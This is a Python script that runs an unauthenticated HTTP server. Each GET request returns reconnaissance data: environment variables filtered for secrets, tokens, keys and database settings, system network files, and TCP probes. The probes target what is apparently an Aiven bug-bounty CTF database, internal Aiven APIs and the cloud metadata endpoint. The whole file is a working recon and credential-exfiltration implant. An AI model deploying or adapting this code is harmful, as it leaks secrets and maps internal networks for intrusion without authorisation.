import http.server, socketserver, json, os, socket, subprocess, time
os.makedirs("/tmp/out", exist_ok=True)

def recon():
    o = {}
    o["uid"] = os.getuid()
    o["hostname"] = socket.gethostname()
    o["env"] = {k: v for k, v in os.environ.items() if any(s in k.upper() for s in ("AIVEN","PG","DB","HOST","URL","JWKS","TARGET","SECRET","TOKEN","KEY"))}
    for f in ("/etc/hosts", "/etc/resolv.conf", "/proc/net/route", "/proc/self/cgroup"):
        try: o[f] = open(f).read()[:2000]
        except Exception as e: o[f] = f"ERR {e}"
    # network reachability to the CTF target and internal services
    probes = {}
    def tcp(host, port, t=5):
        try:
            s = socket.create_connection((host, port), timeout=t); s.close(); return "OPEN"
        except Exception as e: return f"ERR {type(e).__name__}:{str(e)[:60]}"
    for h, p in [("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", 5432),
                 ("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", 22),
                 ("193.122.235.156", 5432), ("api.internal.aiven.io", 443),
                 ("api.aiven.io", 443), ("169.254.169.254", 80), ("example.com", 443)]:
        try: ip = socket.gethostbyname(h)
        except Exception as e: ip = f"DNSFAIL:{e}"
        probes[f"{h}:{p}"] = {"ip": ip, "tcp": tcp(h, p)}
    o["probes"] = probes
    return o

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try: body = json.dumps(recon(), indent=1).encode()
        except Exception as e: body = json.dumps({"error": str(e)}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0", int(os.environ.get("PORT", 3000))), H) as s:
    s.serve_forever()
